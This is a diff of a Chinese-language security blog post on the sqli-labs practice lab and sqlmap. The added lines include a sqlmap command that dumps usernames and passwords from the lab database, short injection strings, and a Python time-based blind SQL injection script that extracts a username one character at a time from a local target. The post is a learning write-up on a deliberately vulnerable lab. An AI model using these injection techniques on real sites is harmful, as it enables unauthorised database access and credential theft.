@@ -3,12 +3,12 @@
   <head>
     <meta charset="utf-8" >
 
-<title>sqli-labs(1~20)脚本、sqlmap学习 | z0ekball</title>
+<title>sqli-labs(1~10)脚本、sqlmap学习 | z0ekball</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1624225990472">
+<link rel="shortcut icon" href="https://z0ekball.github.io/favicon.ico?v=1624308478008">
 <link rel="stylesheet" href="https://z0ekball.github.io/styles/main.css">
 
 
@@ -37,7 +37,7 @@ sqlmap基础知..." />
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://z0ekball.github.io">
-        <img src="https://z0ekball.github.io/images/avatar.png?v=1624225990472" class="site-logo">
+        <img src="https://z0ekball.github.io/images/avatar.png?v=1624308478008" class="site-logo">
         <h1 class="site-title">z0ekball</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -99,7 +99,7 @@ sqlmap基础知..." />
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
           <div class="post-detail">
-            <h2 class="post-title">sqli-labs(1~20)脚本、sqlmap学习</h2>
+            <h2 class="post-title">sqli-labs(1~10)脚本、sqlmap学习</h2>
             <div class="post-date">2021-06-15</div>
             
               <div class="feature-container" style="background-image: url('https://z0ekball.github.io/post-images/sqli-jiao-ben.webp')">
@@ -154,7 +154,8 @@ POST型注入一般用 sqlmap -u url --data POST参数
 <ol start="3">
 <li>常见命令</li>
 </ol>
-<pre><code>--level 5  探测等级(1~5 默认为1，等级越高Payload越多，速度也比较慢)
+<pre><code>--sql-query=&quot; &quot;  执行查询语句
+--level 5  探测等级(1~5 默认为1，等级越高Payload越多，速度也比较慢)
 --is-dba   判断当前用户是否是管理员权限
 --roles    列出数据库管理员角色(仅适用与Oracle数据库)
 --referer  HTTP Referer头(伪造HTTP头中的Referer，当--level等级大于等于3时会通过伪造Referer来进行注入)
@@ -278,6 +279,50 @@ print(name)
 </code></pre>
 <h3 id="结果-3">结果</h3>
 <figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624223954426.png" alt="" loading="lazy"></figure>
+<h1 id="less-7">less-7</h1>
+<p>id=1'))--+,布尔盲注，脚本基本一样<br>
+练习一下sqlmap</p>
+<h3 id="查询开头为a的用户和密码">查询开头为a的用户和密码</h3>
+<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-7/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --sql-query=&quot;select username,password from users where username like 'a%'&quot;;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624275315411.png" alt="" loading="lazy"></figure>
+<h1 id="less-8">less-8</h1>
+<p>id=1'--+,其他一样</p>
+<h1 id="less-9时间盲注">less-9(时间盲注)</h1>
+<h3 id="脚本id2的用户名要多运行一两次排除因为网速出现的延迟">脚本：id=2的用户名，要多运行一两次，排除因为网速出现的延迟</h3>
+<pre><code class="language-python">import time
+import urllib.parse
+import http.client
+
+#爆破字典
+d = list('abcdefghijklmnopqrstuvwxyz')
+name = ''
+url = &quot;127.0.0.1&quot;
+
+#不确定字数情况下，可以手注确认或者把爆破字数范围扩大
+for i in range(1,15):
+    for j in d:
+        time1=time.time() #开始时间
+        c=http.client.HTTPConnection(url)
+        body=&quot;/sqli/Less-9/?id=1%%27%%20and%%20if(mid((select%%20username%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27,sleep(1),0)--+&quot;%(i,j)
+        print(body)
+        c.request(&quot;GET&quot;, body) #确定方式
+        r = c.getresponse() #提取响应包
+        time2=time.time() #结束时间
+        data = r.read()
+        c.close()
+        #确认正确的一项，拼接
+        if time2-time1 &gt;1:
+            name += j
+            print(j)
+            break
+		
+print(name)
+</code></pre>
+<h3 id="结果-4">结果</h3>
+<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624287255225.png" alt="" loading="lazy"></figure>
+<h1 id="less-10">less-10</h1>
+<p>id=1&quot;--+,其他和9一样</p>
 
             </div>
             
